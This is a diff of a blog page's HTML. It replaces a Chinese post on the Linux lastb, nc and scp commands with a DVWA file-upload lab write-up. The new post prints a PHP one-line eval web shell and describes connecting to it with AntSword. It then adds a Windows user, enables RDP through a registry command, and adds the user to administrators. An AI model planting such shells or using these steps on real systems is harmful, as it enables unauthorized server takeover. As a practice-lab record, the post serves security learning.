@@ -10,7 +10,7 @@
   
   <title>
     
-      Linux中的nc命令和scp命令 | HA
+      命令上传漏洞利用 | HA
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -117,8 +117,8 @@
 </header>
 
     <div id="article-banner">
-  <h2>Linux中的nc命令和scp命令</h2>
-  <p class="post-date">2020-05-04</p>
+  <h2>命令上传漏洞利用</h2>
+  <p class="post-date">2020-05-10</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
   </div>
@@ -126,40 +126,44 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><p><strong>lastb命令</strong>用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于<code>/var/log</code>目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p>
-<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><strong>nc命令</strong>是<strong>netcat命令</strong>的简称。</p>
-<ul>
-<li><p>远程拷贝文件</p>
-<p>server1上的文件拷贝到server2中。</p>
-<ul>
-<li><p>server2中运行</p>
+    <section class="markdown-content"><p>颓废了一上午，下午找点事做，之前的测试没做完，先做一点。(っ °Д °;)っ</p>
+<h2 id="命令上传漏洞利用"><a href="#命令上传漏洞利用" class="headerlink" title="命令上传漏洞利用"></a>命令上传漏洞利用</h2><p>练习dvwa中的文件上传漏洞，想着把之前的一句话木马拿过来用，发现之前做的时候没留下痕迹，\┑(￣Д ￣)┍于是从网上找一句话木马再测试一下。</p>
+<p>最简单的一句话木马。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之前还有比较复杂的，但当时做的时候什么也没有留下。现在还是的重头再来。</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3vqr4.png" alt="Y3vqr4.png"></p>
+<p>上传成功，找菜刀连接，又在电脑上找之前下载过的菜刀。orz，最后找到了中国蚁剑。</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3vzPx.png" alt="Y3vzPx.png"></p>
+<p>填入文件上传后的地址和密码，编码设置成GB2312（否则接入终端会出现乱码），</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3xpRK.png" alt="Y3xpRK.png"></p>
+<p>连接成功后，查看系统中存在的用户，并创建一个新用户test。</p>
+<p><code>net user 用户名 密码（可选） /add</code></p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3xeit.png" alt="Y3xeit.png"></p>
+<p>使用远程连接192.168.1.132，连接被拒绝。</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3xnRf.png" alt="Y3xnRf.png"></p>
+<p>打开3389端口，还是连接被拒绝。</p>
 <blockquote>
-<p>netcat -lp 1234 &gt; 123.txt<br>netcat -lp 1234 &gt; 456.txt</p>
+<p>1）开启3389端口：<br>在cmd内，执行如下命令，即可开启3389端口。</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
+<p>2）关闭3389端口：<br>在cmd内，执行如下命令，即可关闭3389端口。</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p>
 </blockquote>
-</li>
-<li><p>server1中运行</p>
-<blockquote>
-<p>nc -w 1 192.168.1.128 1234 &lt; 123.txt<br>nc -w 1 192.168.1.128 1234 &lt; 456.txt</p>
-</blockquote>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p><strong>scp命令</strong>用于在Linux下进行远程拷贝文件的命令，和它类似的命令有<a href="http://man.linuxde.net/cp" target="_blank" rel="noopener">cp</a>，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读<a href="http://man.linuxde.net/read" target="_blank" rel="noopener">read</a> only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，<a href="http://man.linuxde.net/rsync" target="_blank" rel="noopener">rsync</a>就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。</p>
-<blockquote>
-<p>scp <a href="mailto:root@192.168.1.128">root@192.168.1.128</a>:/home/duyada/scp/123.txt /scp</p>
-<p>//复制到本机</p>
-<p>scp /scp/456.txt <a href="mailto:root@192.168.1.128">root@192.168.1.128</a>:/home/duyada/scp/</p>
-<p>//上传到目标机</p>
-</blockquote>
+<p>猜测新建的用户没权限。于是想办法把用户添加到系统组。系统组名称不知道查看已存在的系统用户组。</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3x8ds.png" alt="Y3x8ds.png"></p>
+<p>得到系统用户组名administrators。</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3xUzT.png" alt="Y3xUzT.png"></p>
+<p>命令执行成功。运行mstsc。</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3xdQU.png" alt="Y3xdQU.png"></p>
+<p>完。</p>
 </section>
     <!-- Tags START -->
     
       <div class="tags">
         <span>Tags:</span>
         
-  <a href="/tags#Linux" >
-    <span class="tag-code">Linux</span>
+  <a href="/tags#dvwa" >
+    <span class="tag-code">dvwa</span>
   </a>
 
       </div>
@@ -170,20 +174,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2020/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/">
+      <a class="nav-left" href="/2020/05/04/Linux%E4%B8%AD%E7%9A%84nc%E5%91%BD%E4%BB%A4%E5%92%8Cscp%E5%91%BD%E4%BB%A4/">
         <span class="nav-arrow">← </span>
         
-          计算机网络基础笔记
+          Linux中的nc命令和scp命令
         
       </a>
     
-    
-      <a class="nav-right" href="/2020/05/10/%E5%91%BD%E4%BB%A4%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
-        
-          命令上传漏洞利用
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -205,7 +202,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#lastb"><span class="toc-nav-text">lastb</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#nc"><span class="toc-nav-text">nc</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#scp"><span class="toc-nav-text">scp</span></a></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#命令上传漏洞利用"><span class="toc-nav-text">命令上传漏洞利用</span></a></li></ol>
     
   </div>
 </aside>
@@ -215,7 +212,7 @@
 
 <script>
   (function () {
-    var url = 'http://yoursite.com/2020/05/04/Linux中的nc命令和scp命令/';
+    var url = 'http://yoursite.com/2020/05/10/命令上传漏洞利用/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
